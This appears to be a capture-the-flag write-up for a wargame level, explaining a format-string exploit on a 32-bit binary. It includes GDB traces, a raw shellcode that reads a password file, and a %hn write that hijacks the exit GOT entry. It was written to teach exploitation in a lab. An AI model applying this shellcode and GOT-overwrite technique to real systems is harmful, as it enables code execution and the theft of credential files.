# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit 

# Explanation

The code reads the standard input, and if the character is an uppercase letter, it lowers it:
```
level05@OverRide:~$ ./level05
ABCDEFGHIJKLMNOPQRSTUVWXYZ
abcdefghijklmnopqrstuvwxyz
```

We notice a few things:
1. The buffer has a size of 100, but `fgets()` only reads 100 bytes too (safe)
2. `printf()` prints a buffer we have control on, so we can perform format string exploits
3. There are no returns but an `exit()` call at the end of the main

We start GDB and set a few breakpoints at interesting points of our code:
```
(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048449
(gdb) b fgets
Breakpoint 2 at 0x8048350
(gdb) b printf
Breakpoint 3 at 0x8048340
```

We can pass 100 "A" as an input, to get:
```
Breakpoint 2, 0xf7e90ba0 in fgets () from /lib32/libc.so.6
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 3, 0xf7e78480 in printf () from /lib32/libc.so.6
(gdb) x/20x $esp
0xffffd64c:	0x0804850c	0xffffd678	0x00000064	0xf7fcfac0
0xffffd65c:	0xf7ec3af9	0xffffd69f	0xffffd69e	0x00000000
0xffffd66c:	0xffffffff	0xffffd724	0x00000000	0x61616161
0xffffd67c:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd68c:	0x61616161	0x61616161	0x61616161	0x61616161
(gdb)
```
We can see that `0xffffd67c` is the address at which we start writing in the buffer.

Also, we can see that the return address of the `printf()` call.
```
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
```
`0x0804850c` is found at `0xffffd64c`.

Let's start to discover a little more of the `printf()` mechanisms.
```
level05@OverRide:~$ python -c 'print "AAAAAAAAAAAAAAAAAAAA" + "%p " * 10' | ./level05
aaaaaaaaaaaaaaaaaaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6bf 0xffffd6be (nil) 0xffffffff 0xffffd744 0xf7fdb000 0x61616161
```
As we can see, the 10th argument is the start of the buffer.

What we want to do is simple.
First, reuse the shellcode from level04, but change the flag to open from `level05/.pass` to `level06/.pass`:
Shellcode:
```
\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x01\x6a\x73\x68\x2e\x70\x61\x73\x68\x30\x36\x2f\x2f\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x05\x89\xe3\xb1\x02\xb2\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe1\xb2\x29\xcd\x80\xb0\x04\xb3\x01\x89\xe1\xb2\x29\xcd\x80\xb0\x01\xcd\x80
```
Second, we want to get the address of it using the same program used in the previous level, when using the command `env -i`.
```
level05@OverRide:~$ env -i SHELLCODE=$(python ~/pyshell.py) /tmp/main
0xffffdf8a
```
Where `pyshell.py` prints the shellcode.
The address of the environment variable SHELLCODE will thus be `0xffffdf8a`.

Third, we want to make a Python script (see `script.py`) that will write the address of our environment variable inside of the `exit` entry in the GOT.
To do that, open GDB, disassemble main, and disassemble the address at which `exit` is:
```
(gdb) disass main
...
   0x08048507 <+195>:	call   0x8048340 <printf@plt>
   0x0804850c <+200>:	movl   $0x0,(%esp)
   0x08048513 <+207>:	call   0x8048370 <exit@plt>
End of assembler dump.
(gdb) disass 0x8048370
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
End of assembler dump.
(gdb) x 0x80497e0
0x80497e0 <exit@got.plt>:	0x08048376
```
Currently, the address sotred in the GOT entry is the address of the `push` instruction in the `exit` trampoline function. It pushes 0x18 on the stack, and then calls `_dl_runtine_resolve`, which is a function that finds `exit` in `libc`, writes its address in its GOT entry and executes the function.

However, we might be able to change the value stored in the GOT by the one of our shellcode.
Let's do that!

Because the address of our environment is quite big, thus we will write using two `%hn`.
The first write will make us write 57226 characters for `0xdf8a`, and the second 65535 characters for `0xffff`. The first thing written will have place 10 on the stack and the second place 11, so we can use the `%11$` format for `printf()` to specifies these arguments. 

Then, we simply call the binary with `env -i` and pass it our padded input:
```
level05@OverRide:~$ cat input | env -i SHELLCODE=$(python ~/pyshell.py) ./level05
aaaabbbb
...
80497e2ah4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
But, that password is more lengthy than the others.
Maybe there is something weird about it.

If we look at `strace`, we can see a write before our printing of the password: remove what's been written and you get yourself the flag.
```
level05@OverRide:~$ cat input | env -i SHELLCODE=$(python ~/pyshell.py) strace ./level05
execve("./level05", ["./level05"], [/* 1 var */]) = 0
[ Process PID=3351 runs in 32 bit mode. ]
...
write(1, "                                "..., 1024                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        80497e2a) = 1024
open("////home/users/level06//.pass", O_RDWR) = -1 EACCES (Permission denied)
syscall_4294967043(0xfffffff3, 0xffffdd24, 0x29, 0, 0xffffddfc, 0xffffde08, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) = -1 (errno 38)
syscall_4294967044(0xffffff01, 0xffffdd24, 0x29, 0, 0xffffddfc, 0xffffde08, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) = -1 (errno 38)
syscall_4294967041(0xffffff01, 0xffffdd24, 0x29, 0, 0xffffddfc, 0xffffde08, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0) = -1 (errno 38)
--- SIGSEGV (Segmentation fault) @ 0 (0) ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```
